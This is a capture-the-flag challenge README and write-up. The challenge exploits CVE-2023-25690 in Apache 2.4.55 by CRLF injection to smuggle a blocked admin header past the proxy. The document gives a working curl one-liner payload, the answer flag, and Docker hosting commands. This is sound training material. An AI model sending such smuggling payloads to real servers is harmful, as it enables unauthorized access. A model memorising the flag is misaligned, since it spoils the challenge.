# Willy Wonka Web
Description:
```markdown
Welcome to the world of web! Can you get the flag?

https://wonka.chal.cyberjousting.com

[wonka.zip]
```

**Author**: `Legoclones`

## Writeup
This problem requires exploiting CVE-2023-25690 in Apache 2.4.55 which leads to request smuggling from a CRLF injection. Since NodeJS doesn't support multiple HTTP requests in a single TCP stream (from the HTTP/1.1 spec), you need to smuggle a "forbidden" header that Apache unsets/blocks. The following one-liner is the solution:

`curl 'https://wonka.chal.cyberjousting.com/name/a%20HTTP/1.1%0d%0aa:%20admin%0d%0aX-Bad:'`

**Flag** - `byuctf{i_never_liked_w1lly_wonka}`

## Hosting
This challenge should be a Docker container that runs Apache as a front-end on port 5000. All the proper files are included in here. The command to build the docker container is (when located inside of this directory):

```bash
docker compose up -d
```

To stop the challenge:
```bash
docker compose down
```